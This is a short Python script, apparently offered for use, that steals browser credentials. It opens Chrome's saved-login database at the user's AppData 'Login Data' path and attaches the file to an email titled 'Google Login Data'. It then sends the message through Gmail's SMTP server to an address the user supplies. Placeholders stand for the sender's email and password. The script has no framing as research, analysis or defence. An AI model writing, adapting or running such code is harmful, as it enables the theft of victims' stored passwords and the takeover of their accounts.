
import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 

fromaddr = "your email "
toaddr = " to your email "

# instance of MIMEMultipart 
msg = MIMEMultipart() 

# storing the senders email address 
msg['From'] = fromaddr 

# storing the receivers email address 
msg['To'] = toaddr 

# storing the subject 
msg['Subject'] = "Google Login Data "

# string to store the body of the mail 
body = "Google Login Data "

# attach the body with the msg instance 
msg.attach(MIMEText(body, 'plain')) 

# open the file to be sent 
filename = "Login Data.txt"
attachment = open("C:\\Users\\user\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "rb") 

# instance of MIMEBase and named as p 
p = MIMEBase('application', 'octet-stream') 

# To change the payload into encoded form 
p.set_payload((attachment).read()) 

# encode into base64 
encoders.encode_base64(p) 

p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 

 
msg.attach(p) 


s = smtplib.SMTP('smtp.gmail.com', 587) 


s.starttls() 


s.login(fromaddr, "your - email - password") 


text = msg.as_string() 
 
s.sendmail(fromaddr, toaddr, text) 

 
s.quit() 
